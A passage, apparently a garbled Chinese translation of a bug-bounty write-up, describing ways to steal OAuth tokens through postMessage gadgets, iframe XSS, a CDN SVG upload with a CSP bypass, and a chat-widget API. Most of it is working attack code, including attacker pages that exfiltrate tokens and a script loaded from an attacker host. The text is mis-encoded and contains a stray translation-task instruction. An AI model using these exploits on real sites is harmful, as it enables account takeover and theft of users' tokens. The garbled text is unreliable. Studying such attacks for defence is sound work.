parent.window.b.frames[0].window &&
parent.window.b.frames[0].window.name) {
top.postMessage(parent.window.b.frames[0].window.name, '*');
parent.window.b.close();
clearInterval(x);
}
}, 500);
```

3. æ”»å‡»è€…é¡µé¢ç°åœ¨å¯ä»¥ç›‘å¬æˆ‘ä»¬åˆšåˆšå‘é€çš„å¸¦æœ‰`window.name`çš„æ¶ˆæ¯ï¼š

```html
<script>
window.addEventListener('message', function (e) {
if (e.data) {
document.getElementById('leak').innerText = 'We stole the token: ' + e.data;
}
});
</script>
```

## **Gadget 2: ç¤ºä¾‹2ï¼Œå¸¦æœ‰XSS + çˆ¶æºæ£€æŸ¥çš„iframe**

ç¬¬äºŒä¸ªç¤ºä¾‹æ˜¯ä¸€ä¸ªåœ¨**éhappy path**ä¸ŠåŠ è½½çš„**iframe**ï¼Œå…¶ä¸­ä½¿ç”¨**postMessage**è¿›è¡ŒXSSï¼Œä½†æ˜¯**åªå…è®¸æ¥è‡ª`parent`**çª—å£çš„æ¶ˆæ¯ã€‚å½“iframeå‘`parent`çª—å£å‘é€`initConfig`æ¶ˆæ¯æ—¶ï¼Œ`location.href`è¢«å‘é€åˆ°äº†iframeä¸­ã€‚

ä¸»çª—å£åŠ è½½iframeçš„æ–¹å¼å¦‚ä¸‹ï¼š
```html
<iframe src="https://challenge-iframe.example.com/"></iframe>
```
ä»¥ä¸‹æ˜¯æ¥è‡ªä¸€æœ¬å…³äºé»‘å®¢æŠ€æœ¯çš„ä¹¦ç±çš„å†…å®¹ã€‚ä»¥ä¸‹å†…å®¹æ¥è‡ªæ–‡ä»¶/hive/hacktricks/pentesting-web/oauth-to-account-takeover/oauth-happy-paths-xss-iframes-and-post-messages-to-leak-code-and-state-values.mdã€‚å°†ç›¸å…³çš„è‹±æ–‡æ–‡æœ¬ç¿»è¯‘æˆä¸­æ–‡ï¼Œå¹¶è¿”å›ç¿»è¯‘ç»“æœï¼Œä¿æŒå®Œå…¨ç›¸åŒçš„Markdownå’ŒHTMLè¯­æ³•ã€‚ä¸è¦ç¿»è¯‘ä»£ç ã€é»‘å®¢æŠ€æœ¯åç§°ã€é»‘å®¢æœ¯è¯­ã€äº‘/SaaSå¹³å°åç§°ï¼ˆå¦‚Workspaceã€awsã€gcp...ï¼‰ã€å•è¯â€œleakâ€ã€â€œpentestingâ€å’ŒMarkdownæ ‡ç­¾ã€‚æ­¤å¤–ï¼Œè¯·ä¸è¦æ·»åŠ ä»»ä½•é¢å¤–çš„å†…å®¹ï¼Œåªéœ€æä¾›ç¿»è¯‘å’ŒMarkdownè¯­æ³•å³å¯ã€‚
```html
<script>
window.addEventListener('message', function (e) {
if (e.source !== window.parent) {
// not a valid origin to send messages
return;
}
if (e.data.type === 'loadJs') {
loadScript(e.data.jsUrl);
} else if (e.data.type === 'initConfig') {
loadConfig(e.data.config);
}
});
</script>
```
### æ”»å‡»

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**æ”»å‡»è€…åŠ è½½ä¸€ä¸ªå¸¦æœ‰Post-message XSSæ¼æ´é¡µé¢çš„iframe**ï¼Œå¹¶åˆ©ç”¨XSSåŠ è½½**ä»»æ„JS**ã€‚\
è¿™ä¸ª**JS**å°†ä¼š**æ‰“å¼€ä¸€ä¸ªå¸¦æœ‰OAuthé“¾æ¥çš„æ ‡ç­¾é¡µ**ã€‚åœ¨ç™»å½•åï¼Œæœ€ç»ˆé¡µé¢ä¸­çš„URLä¸­åŒ…å«äº†ä»¤ç‰Œï¼Œå¹¶åŠ è½½äº†ä¸€ä¸ªiframeï¼ˆXSS post-messageæ¼æ´çš„iframeï¼‰ã€‚

ç„¶åï¼Œ**è¢«åˆ©ç”¨çš„XSS**ä¸­çš„**ä»»æ„JS**ï¼ˆæ¥è‡ªäºopenerçš„æ ‡ç­¾é¡µï¼‰å¯ä»¥**è®¿é—®è¯¥iframe**ï¼Œå¹¶ä½¿å…¶**å‘çˆ¶çº§è¯·æ±‚`initConfig`**ï¼ˆå…¶ä¸­åŒ…å«äº†å¸¦æœ‰ä»¤ç‰Œçš„URLï¼‰ã€‚çˆ¶é¡µé¢**å°†å…¶æä¾›ç»™iframe**ï¼Œå¹¶ä¸”**å‘½ä»¤å…¶æ³„éœ²**ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºä¹‹å‰ç¤ºä¾‹çš„æ–¹æ³•ï¼š

1. åˆ›å»ºä¸€ä¸ª**æ¶æ„é¡µé¢**ï¼ŒåµŒå…¥ä¸€ä¸ª**æ²™ç®±çš„iframe**ï¼Œå¹¶åœ¨iframeåŠ è½½æ—¶é™„åŠ ä¸€ä¸ª**onload**ä»¥**è§¦å‘è„šæœ¬**ã€‚

```html
<div id="leak"><iframe
id="i" name="i"
src="https://challenge-iframe.example.com/"
onload="run()"
style="border:0;width:500px;height:500px"></iframe></div>
```

2. ç”±äº**æ¶æ„é¡µé¢æ˜¯iframeçš„çˆ¶çº§**ï¼Œå®ƒå¯ä»¥ä½¿ç”¨**postMessageï¼ˆXSSï¼‰**å‘iframeå‘é€æ¶ˆæ¯ï¼Œä»¥åœ¨æ²™ç®±çš„æºä¸­åŠ è½½æˆ‘ä»¬çš„è„šæœ¬ï¼š

```html
<script>
function run() {
i.postMessage({type:'loadJs',jsUrl:'https://attacker.test/inject.js'}, '*')
}
</script>
```

3. åœ¨æˆ‘åŠ è½½åˆ°æ²™ç®±ä¸­çš„è„šæœ¬ä¸­ï¼Œæˆ‘ç”¨**å—å®³è€…çš„é“¾æ¥**æ›¿æ¢äº†å†…å®¹ï¼š

```javascript
document.body.innerHTML = '<a href="#" onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a>';
```

æˆ‘è¿˜å¯åŠ¨äº†ä¸€ä¸ªè„šæœ¬æ¥**å®šæ—¶æ£€æŸ¥é“¾æ¥æ˜¯å¦è¢«æ‰“å¼€ï¼Œä»¥åŠæˆ‘æƒ³è¦è®¿é—®çš„iframeæ˜¯å¦å­˜åœ¨**ï¼Œä»¥ä¾¿ä»æˆ‘çš„iframeå‘ä¸»çª—å£è¿è¡Œå…¶ä¸­çš„javascriptã€‚ç„¶åï¼Œæˆ‘é™„åŠ äº†ä¸€ä¸ªpostMessageç›‘å¬å™¨ï¼Œå°†æ¶ˆæ¯ä¼ é€’å›æ¶æ„çª—å£ä¸­çš„iframeï¼š

```javascript
x = setInterval(function() {
if(b && b.frames[1]) {
b.frames[1].eval(
'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +
'top.postMessage({type:'initConfig'},"*")'
)
clearInterval(x)
}
}, 500);
```

4. åŠ è½½äº†iframeçš„æ”»å‡»è€…é¡µé¢å¯ä»¥ç›‘å¬æˆ‘ä»ä¸»çª—å£çš„iframeä¸­æ³¨å…¥çš„postMessageç›‘å¬å™¨å‘é€çš„æ¶ˆæ¯ï¼š

```html
<script>
window.addEventListener('message', function (e) {
if (e.data) {
document.getElementById('leak').innerText = 'æˆ‘ä»¬çªƒå–äº†ä»¤ç‰Œï¼š' + JSON.stringify(e.data);
}
});
</script>
```

## Gadget 3: ä½¿ç”¨APIè·å–è¶Šç•ŒURL

![](https://labs.detectify.com/wp-content/uploads/2022/06/Gadget-3--1024x582.png)

è¿™ä¸ªå°å·¥å…·éå¸¸æœ‰è¶£ã€‚å°†å—å®³è€…å¼•å¯¼åˆ°æŸä¸ªåœ°æ–¹ï¼Œç„¶åä»ä¸åŒçš„ä½ç½®è·å–æ•æ„Ÿæ•°æ®ï¼Œè¿™ç§æ„Ÿè§‰éå¸¸ä»¤äººæ»¡è¶³ã€‚

## **Gadget 3: ç¤ºä¾‹1ï¼Œæ²¡æœ‰æºæ£€æŸ¥çš„å­˜å‚¨iframe**

ç¬¬ä¸€ä¸ªç¤ºä¾‹ä½¿ç”¨äº†ä¸€ä¸ªå¤–éƒ¨æœåŠ¡æ¥è¿›è¡Œè·Ÿè¸ªæ•°æ®ã€‚è¯¥æœåŠ¡æ·»åŠ äº†ä¸€ä¸ªâ€œå­˜å‚¨iframeâ€ï¼š
```html
<iframe
id="tracking"
name="tracking"
src="https://cdn.customer1234.analytics.example.com/storage.html">
</iframe>
```
ä¸»çª—å£å°†ä½¿ç”¨postMessageä¸æ­¤iframeè¿›è¡Œé€šä¿¡ï¼Œä»¥å‘é€è·Ÿè¸ªæ•°æ®ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨`storage.html`æ‰€åœ¨çš„æºçš„localStorageä¸­ï¼š
```javascript
tracking.postMessage('{"type": "put", "key": "key-to-save", "value": "saved-data"}', '*');
```
ä¸»çª—å£ä¹Ÿå¯ä»¥è·å–æ­¤å†…å®¹ï¼š
```javascript
tracking.postMessage('{"type": "get", "key": "key-to-save"}', '*');
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example1.png)

å½“iframeåœ¨åˆå§‹åŒ–æ—¶åŠ è½½æ—¶ï¼Œä½¿ç”¨`location.href`ä¿å­˜äº†ç”¨æˆ·æœ€åè®¿é—®ä½ç½®çš„å¯†é’¥ï¼š
```javascript
tracking.postMessage('{"type": "put", "key": "last-url", "value": "https://example.com/?code=test#access_token=test"}', '*');
```
å¦‚æœä½ èƒ½ä¸è¿™ä¸ªæºè¿›è¡Œäº¤æµï¼Œå¹¶è®©å®ƒå‘é€ç»™ä½ å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥ä»è¿™ä¸ªå­˜å‚¨ä¸­è·å–`location.href`ã€‚æœåŠ¡çš„postMessageç›‘å¬å™¨æœ‰ä¸€ä¸ªæºçš„é˜»æ­¢åˆ—è¡¨å’Œå…è®¸åˆ—è¡¨ã€‚çœ‹èµ·æ¥åˆ†ææœåŠ¡å…è®¸ç½‘ç«™å®šä¹‰å…è®¸æˆ–æ‹’ç»çš„æºï¼š
```javascript
var blockList = [];
var allowList = [];
var syncListeners = [];

window.addEventListener('message', function(e) {
// If there's a blockList, check if origin is there and if so, deny
if (blockList && blockList.indexOf(e.origin) !== -1) {
return;
}
// If there's an allowList, check if origin is there, else deny
if (allowList && allowList.indexOf(e.origin) == -1) {
return;
}
// Only parent can talk to it
if (e.source !== window.parent) {
return;
}
handleMessage(e);
});

function handleMessage(e) {
if (data.type === 'sync') {
syncListeners.push({source: e.source, origin: e.origin})
} else {
...
}

window.addEventListener('storage', function(e) {
for(var i = 0; i < syncListeners.length; i++) {
syncListeners[i].source.postMessage(JSON.stringify({type: 'sync', key: e.key, value: e.newValue}), syncListeners[i].origin);
}
}
```
æ­¤å¤–ï¼Œå¦‚æœæ‚¨æœ‰åŸºäº`allowList`çš„æœ‰æ•ˆæ¥æºï¼Œæ‚¨è¿˜å¯ä»¥è¯·æ±‚åŒæ­¥ï¼Œè¿™å°†åœ¨è¿›è¡Œæ›´æ”¹æ—¶å°†æ­¤çª—å£ä¸­çš„ä»»ä½•localStorageæ›´æ”¹å‘é€ç»™æ‚¨ã€‚

### æ”»å‡»

åœ¨OAuthæµç¨‹çš„éæ­£å¸¸è·¯å¾„ä¸ŠåŠ è½½äº†æ­¤å­˜å‚¨çš„ç½‘ç«™ä¸Šï¼Œæœªå®šä¹‰`allowList`çš„æ¥æºï¼›**è¿™å…è®¸ä»»ä½•æ¥æºä¸postMessageç›‘å¬å™¨è¿›è¡Œé€šä¿¡**ï¼Œå¦‚æœæ¥æºæ˜¯çª—å£çš„`parent`ï¼š

1. æˆ‘åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„é¡µé¢ï¼ŒåµŒå…¥äº†ä¸€ä¸ªå­˜å‚¨å®¹å™¨çš„iframeï¼Œå¹¶é™„åŠ äº†ä¸€ä¸ªonloadæ¥åœ¨åŠ è½½iframeæ—¶è§¦å‘è„šæœ¬ã€‚

```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/storage.html"
onload="run()"></iframe></div>
```
2. ç”±äºæ¶æ„é¡µé¢ç°åœ¨æ˜¯iframeçš„çˆ¶çº§ï¼Œå¹¶ä¸”åœ¨`allowList`ä¸­æœªå®šä¹‰ä»»ä½•æ¥æºï¼Œæ¶æ„é¡µé¢å¯ä»¥å‘iframeå‘é€æ¶ˆæ¯ï¼Œå‘Šè¯‰å­˜å‚¨å‘é€ä»»ä½•å¯¹å­˜å‚¨çš„æ›´æ–°çš„æ¶ˆæ¯ã€‚æˆ‘è¿˜å¯ä»¥åœ¨æ¶æ„é¡µé¢ä¸Šæ·»åŠ ä¸€ä¸ªç›‘å¬å™¨ï¼Œä»¥ä¾¦å¬å­˜å‚¨å‘é€çš„ä»»ä½•åŒæ­¥æ›´æ–°ï¼š

```html
<script>
function run() {
i.postMessage({type:'sync'}, '*')
}
window.addEventListener('message', function (e) {
if (e.data && e.data.type === 'sync') {
document.getElementById('leak').innerText = 'æˆ‘ä»¬çªƒå–äº†ä»¤ç‰Œï¼š' + JSON.stringify(e.data);
}
});
</script>
```
3. æ¶æ„é¡µé¢è¿˜å°†åŒ…å«ä¸€ä¸ªå¸¸è§„é“¾æ¥ï¼Œä¾›å—å®³è€…ç‚¹å‡»ï¼š

```html
<a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?..."
target="_blank">ç‚¹å‡»æ­¤å¤„åŠ«æŒä»¤ç‰Œ</a>';
```
4. å—å®³è€…å°†ç‚¹å‡»è¯¥é“¾æ¥ï¼Œç»è¿‡OAuthæµç¨‹ï¼Œå¹¶æœ€ç»ˆåŠ è½½è·Ÿè¸ªè„šæœ¬å’Œå­˜å‚¨iframeçš„éæ­£å¸¸è·¯å¾„ã€‚å­˜å‚¨iframeä¼šæ›´æ–°`last-url`ã€‚ç”±äºlocalStorageå·²æ›´æ–°ï¼Œæ¶æ„é¡µé¢ä¸­çš„iframeå°†è§¦å‘`window.storage`äº‹ä»¶ï¼Œå¹¶ä¸”æ¯å½“å­˜å‚¨æ›´æ”¹æ—¶ï¼Œæ¶æ„é¡µé¢å°†æ”¶åˆ°ä¸€ä¸ªå¸¦æœ‰å—å®³è€…å½“å‰URLçš„postMessageï¼š

<figure><img src="https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example2.png" alt=""><figcaption></figcaption></figure>

## **Gadget 3: example 2, customer mix-up in CDN â€“ DIY storage-SVG without origin check**

ç”±äºåˆ†ææœåŠ¡æœ¬èº«æœ‰ä¸€ä¸ªæ¼æ´èµé‡‘ï¼Œæˆ‘è¿˜æƒ³çœ‹çœ‹æ˜¯å¦æœ‰åŠæ³•æ³„æ¼ä¸ºå­˜å‚¨iframeé…ç½®æ­£ç¡®æ¥æºçš„ç½‘ç«™çš„URLã€‚

å½“æˆ‘å¼€å§‹åœ¨æ²¡æœ‰å®¢æˆ·éƒ¨åˆ†çš„`cdn.analytics.example.com`åŸŸåä¸Šåœ¨çº¿æœç´¢æ—¶ï¼Œæˆ‘æ³¨æ„åˆ°æ­¤CDNè¿˜åŒ…å«ç”±æœåŠ¡çš„å®¢æˆ·ä¸Šä¼ çš„å›¾åƒï¼š
```
https://cdn.analytics.example.com/img/customer42326/event-image.png
https://cdn.analytics.example.com/img/customer21131/test.png
```
æˆ‘è¿˜æ³¨æ„åˆ°åœ¨è¿™ä¸ªCDNä¸Šä»¥`Content-type: image/svg+xml`çš„å½¢å¼å†…è”æä¾›äº†SVGæ–‡ä»¶ï¼š
```
https://cdn.analytics.example.com/img/customer54353/icon-register.svg
```
æˆ‘åœ¨è¯¥æœåŠ¡ä¸Šæ³¨å†Œäº†ä¸€ä¸ªè¯•ç”¨ç”¨æˆ·ï¼Œå¹¶ä¸Šä¼ äº†è‡ªå·±çš„èµ„äº§ï¼Œè¿™äº›èµ„äº§ä¹Ÿæ˜¾ç¤ºåœ¨äº†CDNä¸Šï¼š
```
https://cdn.analytics.example.com/img/customer94342/tiger.svg
```
æœ‰è¶£çš„æ˜¯ï¼Œå¦‚æœä½ ä½¿ç”¨äº†å®¢æˆ·ç‰¹å®šçš„å­åŸŸåæ¥è®¿é—®CDNï¼Œå›¾ç‰‡ä»ç„¶å¯ä»¥è¢«åŠ è½½ã€‚è¿™ä¸ªURLæ˜¯æœ‰æ•ˆçš„ï¼š
```
https://cdn.customer12345.analytics.example.com/img/customer94342/tiger.svg
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example4.png)

è¿™æ„å‘³ç€å…·æœ‰IDï¼ƒ94342çš„å®¢æˆ·å¯ä»¥åœ¨å®¢æˆ·ï¼ƒ12345çš„å­˜å‚¨ä¸­å‘ˆç°SVGæ–‡ä»¶ã€‚

æˆ‘ä¸Šä¼ äº†ä¸€ä¸ªå¸¦æœ‰ç®€å•XSSæœ‰æ•ˆè´Ÿè½½çš„SVGæ–‡ä»¶ï¼š

`https://cdn.customer12345.analytics.example.com/img/customer94342/test.svg`
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 500 500" width="100%" height="100%" version="1.1">
<script xlink:href="data:,alert(document.domain)"></script>
</svg>
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example3.png)

ä¸å¤ªå¥½ã€‚CDNåœ¨`img/`ä¸‹çš„æ‰€æœ‰å†…å®¹ä¸­æ·»åŠ äº†`Content-Security-Policy: default-src 'self'`å¤´éƒ¨ã€‚ä½ è¿˜å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¤´éƒ¨æåˆ°äº†S3 - é€éœ²äº†å†…å®¹æ˜¯ä¸Šä¼ åˆ°äº†ä¸€ä¸ªS3å­˜å‚¨æ¡¶ä¸­ï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example5.png)

S3çš„ä¸€ä¸ªæœ‰è¶£ç‰¹æ€§æ˜¯ï¼Œåœ¨S3ä¸­ç›®å½•å®é™…ä¸Šå¹¶ä¸æ˜¯çœŸæ­£çš„ç›®å½•ï¼›é”®ä¹‹å‰çš„è·¯å¾„è¢«ç§°ä¸ºâ€œå‰ç¼€â€ã€‚è¿™æ„å‘³ç€S3ä¸åœ¨ä¹`/`æ˜¯å¦è¢«URLç¼–ç ï¼Œå¦‚æœä½ åœ¨URLä¸­å¯¹æ¯ä¸ªæ–œæ è¿›è¡ŒURLç¼–ç ï¼Œå®ƒä»ç„¶ä¼šæä¾›å†…å®¹ã€‚å¦‚æœæˆ‘å°†`img/`æ›´æ”¹ä¸ºURLä¸­çš„`img%2f`ï¼Œä»ç„¶å¯ä»¥è§£æå›¾åƒã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒCSPå¤´éƒ¨è¢«ç§»é™¤ï¼ŒXSSè¢«è§¦å‘ï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example6.png)

ç„¶åï¼Œæˆ‘å¯ä»¥ä¸Šä¼ ä¸€ä¸ªSVGï¼Œå®ƒä¼šåˆ›å»ºä¸å¸¸è§„çš„`storage.html`ç›¸åŒå½¢å¼çš„å­˜å‚¨å¤„ç†ç¨‹åºå’ŒpostMessageç›‘å¬å™¨ï¼Œä½†`allowList`ä¸ºç©ºã€‚è¿™ä½¿æˆ‘èƒ½å¤Ÿå¯¹é‚£äº›å·²ç»æ­£ç¡®å®šä¹‰äº†å¯ä»¥ä¸å­˜å‚¨è¿›è¡Œé€šä¿¡çš„å…è®¸æ¥æºçš„ç½‘ç«™è¿›è¡Œç›¸åŒç±»å‹çš„æ”»å‡»ã€‚

æˆ‘ä¸Šä¼ äº†ä¸€ä¸ªçœ‹èµ·æ¥åƒè¿™æ ·çš„SVGï¼š
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 5 5" width="100%" height="100%" version="1.1">
<script xlink:href="data:application/javascript;base64,dmFyIGJsb2NrTGlzdCA9IFtdOwp2YXIgYWxsb3dMaXN0ID0gW107Ci4uLg=="></script>
</svg>
```
æˆ‘å¯ä»¥ä½¿ç”¨ä¸ç¤ºä¾‹ï¼ƒ1ç›¸åŒçš„æ–¹æ³•ï¼Œä½†ä¸æ˜¯å°†`storage.html`åµŒå…¥åˆ°iframeä¸­ï¼Œè€Œæ˜¯å°†SVGä¸URLç¼–ç çš„æ–œæ åµŒå…¥åˆ°iframeä¸­ï¼š
```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
onload="run()"></iframe></div>
```
ç”±äºæ²¡æœ‰ç½‘ç«™èƒ½å¤Ÿè‡ªè¡Œä¿®å¤æ­¤é—®é¢˜ï¼Œæˆ‘å‘è´Ÿè´£CDNçš„åˆ†ææä¾›è€…å‘é€äº†ä¸€ä»½æŠ¥å‘Šï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

å…³äºæŸ¥çœ‹ç¬¬ä¸‰æ–¹çš„é…ç½®é”™è¯¯æ¼æ´çš„æ•´ä¸ªæƒ³æ³•ä¸»è¦æ˜¯ä¸ºäº†ç¡®è®¤å­˜åœ¨å¤šç§æ–¹æ³•æ¥æ³„éœ²ä»¤ç‰Œï¼Œå¹¶ä¸”ç”±äºç¬¬ä¸‰æ–¹æœ‰ä¸€ä¸ªæ¼æ´èµé‡‘è®¡åˆ’ï¼Œè¿™åªæ˜¯åŒä¸€ç±»å‹æ¼æ´çš„ä¸åŒæ¥æ”¶è€…ï¼Œä¸åŒä¹‹å¤„åœ¨äºå½±å“èŒƒå›´æ˜¯åˆ†ææœåŠ¡çš„æ‰€æœ‰å®¢æˆ·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¬¬ä¸‰æ–¹çš„å®¢æˆ·å®é™…ä¸Šæœ‰èƒ½åŠ›æ­£ç¡®é…ç½®å·¥å…·ï¼Œä»¥é˜²æ­¢æ•°æ®æ³„éœ²ç»™æ”»å‡»è€…ã€‚ç„¶è€Œï¼Œç”±äºæ•æ„Ÿæ•°æ®ä»ç„¶å‘é€ç»™ç¬¬ä¸‰æ–¹ï¼Œæœ‰è¶£çš„æ˜¯çœ‹çœ‹æ˜¯å¦æœ‰åŠæ³•å®Œå…¨ç»•è¿‡å®¢æˆ·å¯¹å·¥å…·çš„æ­£ç¡®é…ç½®ã€‚

## **Gadget 3: ç¤ºä¾‹3ï¼ŒèŠå¤©å°éƒ¨ä»¶API**

æœ€åä¸€ä¸ªç¤ºä¾‹æ˜¯åŸºäºä¸€ä¸ªèŠå¤©å°éƒ¨ä»¶ï¼Œè¯¥å°éƒ¨ä»¶å­˜åœ¨äºç½‘ç«™çš„æ‰€æœ‰é¡µé¢ä¸Šï¼Œç”šè‡³æ˜¯é”™è¯¯é¡µé¢ä¸Šã€‚æœ‰å¤šä¸ªpostMessageç›‘å¬å™¨ï¼Œå…¶ä¸­ä¸€ä¸ªæ²¡æœ‰æ­£ç¡®çš„æ¥æºæ£€æŸ¥ï¼Œåªå…è®¸æ‚¨å¯åŠ¨èŠå¤©å¼¹å‡ºçª—å£ã€‚å¦ä¸€ä¸ªç›‘å¬å™¨å¯¹èŠå¤©å°éƒ¨ä»¶è¿›è¡Œäº†ä¸¥æ ¼çš„æ¥æºæ£€æŸ¥ï¼Œä»¥æ¥æ”¶åˆå§‹åŒ–è°ƒç”¨å’Œç”¨äºå½“å‰ç”¨æˆ·çš„å½“å‰èŠå¤©APIä»¤ç‰Œã€‚
```html
<iframe src="https://chat-widget.example.com/chat"></iframe>
<script>
window.addEventListener('message', function(e) {
if (e.data.type === 'launch-chat') {
openChat();
}
});

function openChat() {
...
}

var chatApiToken;
window.addEventListener('message', function(e) {
if (e.origin === 'https://chat-widget.example.com') {
if (e.data.type === 'chat-widget') {
if (e.data.key === 'api-token') {
chatApiToken = e.data.value;
}
if(e.data.key === 'init') {
chatIsLoaded();
}
}
}
});

function chatIsLoaded() {
...
}
</script>
```
å½“èŠå¤©iframeåŠ è½½æ—¶ï¼š

1. å¦‚æœèŠå¤©å°éƒ¨ä»¶çš„localStorageä¸­å­˜åœ¨chat-api-tokenï¼Œåˆ™ä¼šä½¿ç”¨postMessageå°†api-tokenå‘é€ç»™å…¶çˆ¶çº§ã€‚å¦‚æœæ²¡æœ‰chat-api-tokenå­˜åœ¨ï¼Œåˆ™ä¸å‘é€ä»»ä½•å†…å®¹ã€‚
2. å½“iframeåŠ è½½å®Œæˆåï¼Œå®ƒå°†å‘å…¶çˆ¶çº§å‘é€ä¸€ä¸ªå¸¦æœ‰`{"type": "chat-widget", "key": "init"}`çš„postMessageã€‚

å¦‚æœæ‚¨åœ¨ä¸»çª—å£ä¸­ç‚¹å‡»èŠå¤©å›¾æ ‡ï¼š

1. å¦‚æœå°šæœªå‘é€chat-api-tokenï¼Œåˆ™èŠå¤©å°éƒ¨ä»¶å°†åˆ›å»ºä¸€ä¸ªå¹¶å°†å…¶æ”¾å…¥è‡ªå·±çš„originçš„localStorageä¸­ï¼Œå¹¶å°†å…¶é€šè¿‡postMessageå‘é€ç»™çˆ¶çª—å£ã€‚
2. ç„¶åï¼Œçˆ¶çª—å£å°†å¯¹èŠå¤©æœåŠ¡è¿›è¡ŒAPIè°ƒç”¨ã€‚APIç«¯ç‚¹å—åˆ°ç‰¹å®šä¸ºè¯¥æœåŠ¡é…ç½®çš„ç½‘ç«™çš„CORSé™åˆ¶ã€‚æ‚¨å¿…é¡»ä¸ºå¸¦æœ‰chat-api-tokençš„APIè°ƒç”¨æä¾›æœ‰æ•ˆçš„`Origin`æ ‡å¤´ï¼Œä»¥å…è®¸å‘é€è¯·æ±‚ã€‚
3. ä¸»çª—å£çš„APIè°ƒç”¨å°†åŒ…å«`location.href`å¹¶å°†å…¶æ³¨å†Œä¸ºå…·æœ‰chat-api-tokençš„è®¿å®¢çš„â€œå½“å‰é¡µé¢â€ã€‚ç„¶åï¼Œå“åº”å°†åŒ…å«ç”¨äºè¿æ¥åˆ°websocketä»¥å¯åŠ¨èŠå¤©ä¼šè¯çš„ä»¤ç‰Œï¼š

```json
{
"api_data": {
"current_page": "https://example.com/#access_token=test",
"socket_key": "xxxyyyzzz",
...
}
}
```

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘æ„è¯†åˆ°èŠå¤©api-tokençš„å…¬å‘Šæ€»æ˜¯ä¼šè¢«å…¬å‘Šç»™èŠå¤©å°éƒ¨ä»¶iframeçš„çˆ¶çº§ï¼Œå¦‚æœæˆ‘å¾—åˆ°äº†chat-api-tokenï¼Œæˆ‘å¯ä»¥ä½¿ç”¨è¯¥ä»¤ç‰Œè¿›è¡ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ï¼Œç„¶ååœ¨APIè°ƒç”¨ä¸­æ·»åŠ è‡ªå·±çš„äººä¸º`Origin`æ ‡å¤´ï¼Œå› ä¸ºCORSæ ‡å¤´åªå¯¹æµè§ˆå™¨æœ‰æ•ˆã€‚è¿™å¯¼è‡´äº†ä»¥ä¸‹é“¾ï¼š

1. åˆ›å»ºä¸€ä¸ªæ¶æ„é¡µé¢ï¼ŒåµŒå…¥èŠå¤©å°éƒ¨ä»¶çš„iframeï¼Œå¹¶æ·»åŠ ä¸€ä¸ªpostMessageç›‘å¬å™¨æ¥ç›‘å¬chat-api-tokenã€‚è¿˜è§¦å‘ä¸€ä¸ªäº‹ä»¶æ¥é‡æ–°åŠ è½½iframeï¼Œå¦‚æœåœ¨2ç§’å†…æ²¡æœ‰è·å–åˆ°api-tokenã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿æˆ‘ä¹Ÿæ”¯æŒä»æœªå¯åŠ¨èŠå¤©çš„å—å®³è€…ï¼Œå¹¶ä¸”ç”±äºæˆ‘å¯ä»¥è¿œç¨‹è§¦å‘æ‰“å¼€èŠå¤©ï¼Œæ‰€ä»¥æˆ‘é¦–å…ˆéœ€è¦chat-api-tokenæ¥å¼€å§‹è½®è¯¢æ¥è‡ªæœåŠ¡å™¨ç«¯çš„èŠå¤©APIä¸­çš„æ•°æ®ã€‚

```html
<div id="leak"><iframe
id="i" name="i"
src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
<script>
var gotToken = false;
function reloadToCheck() {
if (gotToken) return;
setTimeout(function() {
document.getElementById('i').src = 'https://chat-widget.example.com/chat?' + Math.random();
}, 2000);
}
window.onmessage = function(e) {
if (e.data.key === 'api-token') {
gotToken = true;
lookInApi(e.data.value);
}
}
launchChatWindowByPostMessage();
</script>
```
2. æ·»åŠ ä¸€ä¸ªé“¾æ¥åˆ°æ¶æ„é¡µé¢ï¼Œä»¥æ‰“å¼€ä»¥å¸¦æœ‰ä»¤ç‰Œçš„URLç»“æŸçš„ç™»å½•æµç¨‹ï¼š

```
<a href="#" onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">ç‚¹å‡»æ­¤å¤„åŠ«æŒä»¤ç‰Œ</a>
```
3. `launchChatWindowByPostMessage()`å‡½æ•°å°†æŒç»­å‘ä¸»çª—å£å‘é€postMessageï¼Œå¦‚æœæ‰“å¼€ï¼Œåˆ™å¯åŠ¨èŠå¤©å°éƒ¨ä»¶ï¼š

```javascript
function launchChatWindowByPostMessage() {
var launch = setInterval(function() {
if(b) { b.postMessage({type: 'launch-chat'}, '*'); }
}, 500);
}
```
